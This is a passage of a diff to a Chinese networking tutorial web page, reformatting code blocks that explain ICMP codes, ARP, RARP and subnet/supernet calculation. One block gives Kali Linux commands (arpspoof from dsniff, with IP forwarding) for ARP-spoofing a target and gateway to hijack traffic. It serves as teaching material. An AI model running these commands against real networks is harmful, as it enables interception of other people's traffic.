+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">code：0、1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0：IP数据报头的参数错误，Pointer表示错误的字节位置</span></span><br><span class="line"><span class="comment"># 1：缺少必需的选项</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="源冷却（Source-Quench）"><a href="#源冷却（Source-Quench）" class="headerlink" title="源冷却（Source Quench）"></a>源冷却（Source Quench）</h4><p>type：source-quench，4</p>
 <p>code：0，路由器在处理报文时会有一个缓存队列。如果超过最大缓存队列，将无法处理，从而丢弃报文。并向源发送方发一个 ICMP 源冷却报文，告诉对方：“嘿，我这里客满了，你迟点再来。”</p>
 <h4 id="重定向（Redirect）"><a href="#重定向（Redirect）" class="headerlink" title="重定向（Redirect）"></a>重定向（Redirect）</h4><p>type：redirect，5</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash">code：0 - <span class="token number">3</span>
-
-<span class="token comment"># 0：网络重定向</span>
-<span class="token comment"># 1：主机重定向</span>
-<span class="token comment"># 2：服务类型和网络重定向</span>
-<span class="token comment"># 3：服务类型和主机重定向</span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">code：0 - 3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0：网络重定向</span></span><br><span class="line"><span class="comment"># 1：主机重定向</span></span><br><span class="line"><span class="comment"># 2：服务类型和网络重定向</span></span><br><span class="line"><span class="comment"># 3：服务类型和主机重定向</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="请求回显或回显应答（Echo-or-Echo-Reply）"><a href="#请求回显或回显应答（Echo-or-Echo-Reply）" class="headerlink" title="请求回显或回显应答（Echo or Echo Reply）"></a>请求回显或回显应答（Echo or Echo Reply）</h4><p>type：echo-request，8，请求回显，ping 请求；</p>
 <pre><code>code：0，因为只有这一个功能，所以code只为0
@@ -588,14 +494,7 @@ net.core.netdev_max_backlog <span class="token operator">=</span> <span class="t
 <p><img data-src="//img.to2b.cn/blog/ljk/1598355062997.png"></p>
 <p>显然这种方式是不安全的，例如 pc1 想上网，上网得通过路由器，那就得拿到路由器的 MAC 地址，于是 pc1 就发送广播请求路由器的 MAC 地址，同一个局域网下 pc2 冒充路由器把自己的 MAC 地址回复给 pc1，如果 pc1 不做校验就信以为真，那之后 pc1 所有的网路请求都找 pc2，pc2 帮它转发到真正的路由器。</p>
 <p>范例：kali 系统实现 arp 欺骗上网流量劫持</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#启动路由转发功能</span>
-<span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># echo 1 > /proc/sys/net/ipv4/ip_forward</span>
-<span class="token comment">#安装包</span>
-<span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># apt-get install dsniff</span>
-<span class="token comment">#欺骗目标主机，本机是网关</span>
-<span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># arpspoof -i eth0 -t 被劫持的目标主机IP 网关IP</span>
-<span class="token comment">#欺骗网关，本机是目标主机</span>
-<span class="token punctuation">[</span>root@kali ~<span class="token punctuation">]</span><span class="token comment"># arpspoof -i eth0 -t 网关IP 被劫持的目标主机IP</span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动路由转发功能</span></span><br><span class="line">[root@kali ~]<span class="comment"># echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span></span><br><span class="line"><span class="comment">#安装包</span></span><br><span class="line">[root@kali ~]<span class="comment"># apt-get install dsniff</span></span><br><span class="line"><span class="comment">#欺骗目标主机，本机是网关</span></span><br><span class="line">[root@kali ~]<span class="comment"># arpspoof -i eth0 -t 被劫持的目标主机IP 网关IP</span></span><br><span class="line"><span class="comment">#欺骗网关，本机是目标主机</span></span><br><span class="line">[root@kali ~]<span class="comment"># arpspoof -i eth0 -t 网关IP 被劫持的目标主机IP</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="Gratuitous-ARP"><a href="#Gratuitous-ARP" class="headerlink" title="Gratuitous ARP"></a>Gratuitous ARP</h4><p>Gratuitous ARP 也称为免费 ARP，无故 ARP。Gratuitous ARP 不同于一般的 ARP 请求，它并非期待得到 ip 对应的 mac 地址，而是当主机启动的时候，将发送一个 Gratuitous arp 请求，即请求自己的 ip 地址的 mac 地址。具体表现形式为自问自答。Wireshark 监听 vmware 虚拟机启动可以抓到相应的包。</p>
 <h3 id="RARP"><a href="#RARP" class="headerlink" title="RARP"></a>RARP</h3><p>ARP 是将 ip 转成 MAC，RARP 是将 MAC 转成 ip。在网吧中会用到，网吧中的电脑是没有硬盘的，操作系统、软件、数据等都放在服务器中，每次开机都先通过网卡把初始化的操作系统下载下来放到内存中，再从内存中加载。加载的过程中使用 RARP 获取 ip，过程如下：</p>
@@ -676,24 +575,7 @@ net.core.netdev_max_backlog <span class="token operator">=</span> <span class="t
 <h4 id="判断对方主机是否在同一网段："><a href="#判断对方主机是否在同一网段：" class="headerlink" title="判断对方主机是否在同一网段："></a>判断对方主机是否在同一网段：</h4><p>用自已的子网掩码分别和自已的 IP 及对方的 IP 相与，比较结果，相同则同一网段，不同则不同网段。不同的网段是不能通信的。</p>
 <h3 id="划分子网-Subnet"><a href="#划分子网-Subnet" class="headerlink" title="划分子网 Subnet"></a>划分子网 Subnet</h3><p>划分子网：将一个大的网络（主机数多）划分成多个小的网络（主机数少），网络 ID 位向主机 ID 位借位，主机 ID 位数变少，网络 ID 位数变多。</p>
 <h3 id="优化-IP-地址分配"><a href="#优化-IP-地址分配" class="headerlink" title="优化 IP 地址分配"></a>优化 IP 地址分配</h3><p>合并超网：将多个小网络合并成一个大网，主机 ID 位向网络位借位。</p>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 8个C类网段</span>
-<span class="token number">220.78</span>.168.0/24
-<span class="token number">220.78</span>.169.0/24
-<span class="token number">220.78</span>.170.0/24
-<span class="token number">220.78</span>.171.0/24
-<span class="token number">220.78</span>.172.0/24
-<span class="token number">220.78</span>.173.0/24
-<span class="token number">220.78</span>.174.0/24
-<span class="token number">220.78</span>.175.0/24
-<span class="token number">220.78</span>.10101 000.0  <span class="token number">220.78</span>.168.0/24
-<span class="token number">220.78</span>.10101 001.0  <span class="token number">220.78</span>.169.0/24
-<span class="token number">220.78</span>.10101 010.0  <span class="token number">220.78</span>.170.0/24
-<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>
-<span class="token number">220.78</span>.10101 <span class="token number">110.0</span>  <span class="token number">220.78</span>.174.0/24
-<span class="token number">220.78</span>.10101 <span class="token number">111.0</span>  <span class="token number">220.78</span>.175.0/24
-
-<span class="token comment"># 合并成</span>
-<span class="token number">220.78</span>.168.0/21</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 8个C类网段</span></span><br><span class="line">220.78.168.0/24</span><br><span class="line">220.78.169.0/24</span><br><span class="line">220.78.170.0/24</span><br><span class="line">220.78.171.0/24</span><br><span class="line">220.78.172.0/24</span><br><span class="line">220.78.173.0/24</span><br><span class="line">220.78.174.0/24</span><br><span class="line">220.78.175.0/24</span><br><span class="line">220.78.10101 000.0  220.78.168.0/24</span><br><span class="line">220.78.10101 001.0  220.78.169.0/24</span><br><span class="line">220.78.10101 010.0  220.78.170.0/24</span><br><span class="line">......</span><br><span class="line">220.78.10101 110.0  220.78.174.0/24</span><br><span class="line">220.78.10101 111.0  220.78.175.0/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并成</span></span><br><span class="line">220.78.168.0/21</span><br></pre></td></tr></table></figure>
 
 <h3 id="跨网络通信"><a href="#跨网络通信" class="headerlink" title="跨网络通信"></a>跨网络通信</h3><p>跨网络通信：路由、选择路径</p>
 <p>路由分类：主机路由、网络路由、默认路由</p>
